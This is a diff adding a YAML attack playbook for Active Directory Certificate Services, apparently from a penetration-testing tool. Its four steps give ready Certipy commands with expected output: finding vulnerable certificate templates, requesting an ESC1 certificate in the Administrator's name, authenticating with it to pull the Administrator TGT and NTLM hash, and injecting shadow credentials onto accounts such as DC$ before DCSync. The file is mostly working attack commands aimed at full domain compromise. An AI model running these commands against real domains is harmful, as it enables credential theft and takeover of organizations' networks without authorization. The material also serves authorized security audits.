@@ -1,0 +1,81 @@
+id: adcs
+name: Active Directory Certificate Services (AD CS & Certipy)
+category: ad
+description: Comprehensive methodology from Orange Cyberdefense mindmap for auditing and exploiting AD CS certificate templates (ESC1-ESC8), Shadow Credentials, and Pass-the-Certificate.
+port_triggers:
+  - 80
+  - 443
+  - 389
+  - 445
+  - 88
+service_triggers:
+  - adcs
+  - certsrv
+  - ca
+tags:
+  - adcs
+  - certipy
+  - shadow-credentials
+  - esc1
+  - certificates
+steps:
+  - id: adcs-certipy-find
+    title: AD CS Vulnerable Certificate Template Discovery (Certipy)
+    phase: enumeration
+    purpose: Query Active Directory Certificate Services to detect misconfigured and exploitable certificate templates (ESC1, ESC2, ESC3, ESC4, ESC8).
+    command: certipy find -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -dc-ip {{TARGET}} -vulnerable -stdout
+    expected_output:
+      - '[*] Finding certificate templates...'
+      - '[!] Vulnerabilities'
+      - '    ESC1: Client Authentication, Enrollee Supplies Subject, Any Purpose'
+      - '    Template: UserTemplate'
+    common_mistakes:
+      - Not supplying `-dc-ip` if DNS is unable to resolve Domain Controller FQDN.
+    if_success: Vulnerable ESC template found! Request administrative certificate.
+    if_failure: No ESC1-ESC4 templates found. Check Web Enrollment NTLM relay (ESC8).
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/
+  - id: adcs-esc1-request
+    title: ESC1 Template Request with Administrator UPN SAN
+    phase: exploitation
+    purpose: Request an enrollment certificate supplying the Domain Administrator UPN as an alternate Subject Alternative Name (SAN).
+    command: certipy req -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -ca '{{CA_NAME|CORP-CA}}' -template '{{TEMPLATE|UserTemplate}}' -upn 'administrator@{{DOMAIN|corp.local}}' -dc-ip {{TARGET}}
+    expected_output:
+      - '[*] Requesting certificate...'
+      - '[*] Successfully requested certificate'
+      - '[*] Saved certificate and private key to `administrator.pfx`'
+    common_mistakes:
+      - Ensure template name and CA name match exact casing from `certipy find` output.
+    if_success: '`administrator.pfx` certificate generated! Authenticate via PKINIT / Pass-the-Certificate.'
+    if_failure: Certificate enrollment rejected (Approval required). Check ESC8 relay.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/
+  - id: adcs-pass-the-certificate
+    title: Pass-the-Certificate & NTLM Hash Extraction
+    phase: exploitation
+    purpose: Authenticate against the Domain Controller using the `.pfx` certificate to retrieve the Administrator TGT and plaintext NTLM hash.
+    command: certipy auth -pfx administrator.pfx -dc-ip {{TARGET}}
+    expected_output:
+      - '[*] Got TGT for `administrator@corp.local`'
+      - '[*] Got NTLM hash: administrator:500:aad3b4...:31d6cfe0d16ae931b73c59d7e0c089c0:::'
+    common_mistakes:
+      - Sync your clock with the DC if Kerberos rejects timestamp.
+    if_success: Domain Administrator NTLM hash dumped! Full domain compromise.
+    if_failure: PKINIT not supported on DC. Use certificate with Schannel LDAP binding.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/
+  - id: adcs-shadow-credentials
+    title: Shadow Credentials Attack (msDS-KeyCredentialLink)
+    phase: exploitation
+    purpose: If you have GenericWrite/WriteProperty on a user or computer account, write shadow credentials to take over the account without changing its password.
+    command: certipy shadow auto -u '{{USERNAME}}@{{DOMAIN|corp.local}}' -p '{{PASSWORD}}' -account '{{TARGET_ACCOUNT|DC$}}' -dc-ip {{TARGET}}
+    expected_output:
+      - '[*] Generating certificate...'
+      - '[*] Successfully updated `msDS-KeyCredentialLink`'
+      - '[*] Got NTLM hash for `DC$`'
+    common_mistakes:
+      - Requires functional KDC PKINIT support on the Domain Controller.
+    if_success: Shadow credentials injected and target account hash retrieved! Proceed to DCSync.
+    if_failure: Write permission missing on target object. Check BloodHound for ACL write paths.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/
